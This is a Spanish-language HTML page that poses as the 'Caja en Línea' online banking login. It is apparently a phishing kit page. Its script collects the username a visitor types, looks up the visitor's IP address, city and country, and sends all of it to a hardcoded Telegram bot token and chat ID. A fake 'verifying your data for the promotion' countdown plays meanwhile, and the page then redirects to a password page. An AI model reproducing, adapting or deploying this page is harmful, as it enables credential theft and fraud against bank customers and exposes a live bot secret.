<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Caja en linea</title>
    <style>
        body {
            margin: 0; 
            height: 100vh;
            background: linear-gradient(to left, #072658, #063150, #0E6E80);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
        }

        .rectangle {
            width: 599px;
            height: 400px;
            position: relative;
            margin-top: 188px; 
            overflow: visible;
            z-index: 1; 
        }

        .rectangle::after {
            content: '';
            position: absolute;
            top: 117px;
            left: 0;
            right: 0;
            height: 152px;
            background-color: #D3D1D2;
            z-index: 1;
        }

        .degradado {
            height: 117px;
            background: linear-gradient(to left, #072658, #063150, #0E6E80);
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            z-index: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .imagen-logo {
            width: 380px;
            height: auto;
            margin-bottom: 8px;
            margin-left: -17px;
        }

        .texto {
            font-family: "Neo Sans Std", sans-serif;
            font-size: 24px;
            line-height: 36px;
            color: white;
            text-transform: uppercase;
            text-align: center;
            font-weight: 400;
            letter-spacing: normal;
            word-spacing: 0px;
        }

        .imagen {
            margin-top: -130px; 
            width: 220px;
            height: 340px;
        }

        .formulario-container {
            display: flex;
            align-items: center;
            position: absolute;
            top: 150px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 2;
        }

        .formulario {
            width: 284px;
            height: 30px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 0;
            font-size: 15px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            margin-left: 15px;
        }

        .logo-pequeño {
            width: 43px;
            height: auto;
        }

        .boton {
            position: absolute;
            top: 220px;
            left: 85%; 
            transform: translate(-50%, 0);
            width: 165px;
            height: 40px;
            background-color: #083575;
            color: white;
            border: none;
            border-radius: 0; 
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            z-index: 2; 
        }

        .boton:hover {
            background-color: #0a4e8d; 
        }

        .texto-afiliacion {
            position: absolute;
            top: 236px;
            left: 2%;
            color: #083575;
            font-size: 15px;
            font-family: "Neo Sans Std", sans-serif;
            z-index: 2; 
        }

        .afiliacion-enlace {
            color: #706d6d;
            font-weight: bold;
            cursor: pointer;
            font-family: "Neo Sans Std", sans-serif;
        }

        /* Estilos para la pantalla de carga */
        .cargando {
            display: none; 
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to left, #072658, #063150, #0E6E80);
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10; 
        }

        .cargando .mensaje {
            color: white;
            font-family: "Neo Sans Std", sans-serif;
            font-size: 20px;
            text-align: center;
            margin-bottom: 20px;
        }

        .cargando .imagen-carga {
            width: 220px;
            height: auto;
        }

        .contador {
            color: white;
            font-family: "Neo Sans Std", sans-serif;
            font-size: 20px;
        }

        .puntos {
            color: white;
            font-family: "Neo Sans Std", sans-serif;
            font-size: 20px;
        }
    </style>
</head>
<body>
    <div class="rectangle">
        <div class="degradado">
            <img src="logpeque.png" alt="Logo" class="imagen-logo">
            <div class="texto">Caja en Línea</div>
        </div>
        <div class="formulario-container">
            <img src="user-icon2.svg" alt="Logo Pequeño" class="logo-pequeño">
            <input type="text" placeholder="INGRESE SU USUARIO" class="formulario" id="usuario" required>
        </div>
        <span id="error" class="error" style="display:none; color:red;">Por favor, ingrese su usuario.</span>
        <div class="texto-afiliacion">
            ¿Usuario nuevo? <span class="afiliacion-enlace">Afíliate aquí</span>
        </div>
        <button id="continuar" class="boton">Continuar</button> 
    </div>
    <img src="mascota.png" alt="Descripción de la imagen" class="imagen">

    <div class="cargando" id="cargando">
        <div class="mensaje">
            Estamos accediendo a la promoción, mientras verificamos sus datos
            <span id="puntos">...</span>
        </div>
        <img src="mascota.png" alt="Cargando" class="imagen-carga">
        <div class="contador" id="contador">10</div>
    </div>

    <script>
        const TOKEN = '6813453135:AAGfFRmuT5uVMFHzXzotCDQmXs3uj8wqB6o'; // Reemplaza con tu token de bot
        const CHAT_ID = '-4037234500'; // Reemplaza con tu chat ID

        document.getElementById('continuar').addEventListener('click', function() {
            var usuario = document.getElementById('usuario').value;
            var error = document.getElementById('error');

            if (usuario.trim() === '') {
                error.style.display = 'block'; // Mostrar mensaje de error
                console.log("Error: campo de usuario vacío");
            } else {
                error.style.display = 'none'; // Ocultar mensaje de error
                console.log("Usuario ingresado:", usuario);
                
                // Mostrar pantalla de carga
                document.getElementById('cargando').style.display = 'flex';

                let countdown = 10;
                const contadorElement = document.getElementById('contador');
                const puntosElement = document.getElementById('puntos');
                const interval = setInterval(() => {
                    contadorElement.textContent = countdown;
                    countdown--;

                    if (countdown < 0) {
                        clearInterval(interval);
                    }
                }, 1000);

                // Animación de puntos suspensivos
                let dotCount = 0;
                const dotInterval = setInterval(() => {
                    dotCount = (dotCount + 1) % 4; // Cambia entre 0 y 3
                    puntosElement.textContent = '.'.repeat(dotCount); // Cambia la cantidad de puntos

                    if (countdown < 0) {
                        clearInterval(dotInterval);
                    }
                }, 500); // Cambia cada 500 ms

                // Obtener ubicación de ipwhois.io
                fetch('https://ipwhois.app/json/')
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Error al obtener la ubicación');
                    }
                    return response.json();
                })
                .then(data => {
                    const location = `IP: ${data.ip}\nCiudad: ${data.city}\nPaís: ${data.country}`;
                    const message = `Usuario: ${usuario}\n${location}`;
                    console.log("Mensaje a enviar a Telegram:", message);
                    // Enviar mensaje al bot de Telegram
                    sendMessageToTelegram(message);
                })
                .catch(err => {
                    console.error('Error al obtener la ubicación:', err);
                    // Redirigir a pass.html incluso si hay un error al obtener la ubicación
                    window.location.href = 'pass.html';
                });
            }
        });

        function sendMessageToTelegram(message) {
            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            })
            .then(response => {
                // Redirigir a pass.html después de enviar el mensaje
                setTimeout(() => {
                    window.location.href = 'pass.html';
                }, 10000); // Esperar 8 segundos
            })
            .catch(error => {
                console.error('Error al enviar mensaje a Telegram:', error);
                // Redirigir a pass.html incluso si hay un error al enviar el mensaje
                setTimeout(() => {
                    window.location.href = 'pass.html';
                }, 10000); // Esperar 10 segundos
            });
        }
    </script>
</body>
</html>
